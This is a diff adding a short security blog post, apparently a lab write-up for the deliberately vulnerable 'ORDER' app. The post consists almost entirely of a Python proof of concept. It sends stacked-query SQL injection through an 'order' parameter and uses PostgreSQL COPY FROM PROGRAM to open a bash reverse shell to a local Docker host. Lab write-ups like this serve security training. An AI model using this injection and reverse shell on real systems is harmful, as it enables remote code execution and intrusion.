@@ -1,0 +1,28 @@
+---
+layout: post
+title:  "Writeup ORDER"
+date:   2022-11-07 23:33:00 +0900
+categories: security
+---
+
+# ORDER
+[https://github.com/bmdyy/order](https://github.com/bmdyy/order)
+
+# PoC
+
+```python
+import requests
+
+target_url = "http://172.17.0.2:5000/horses"
+
+sqli = "1;\n"
+sqli += "DROP TABLE IF EXISTS cmd_exec;\n"
+sqli += "CREATE TABLE cmd_exec(cmd_output text);\n"
+sqli += "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/172.17.0.1/9292 0>&1\"'";
+
+params = {
+    'order': sqli
+}
+
+requests.get(target_url, params=params, proxies={'http':'127.0.0.1:8080'})
+```
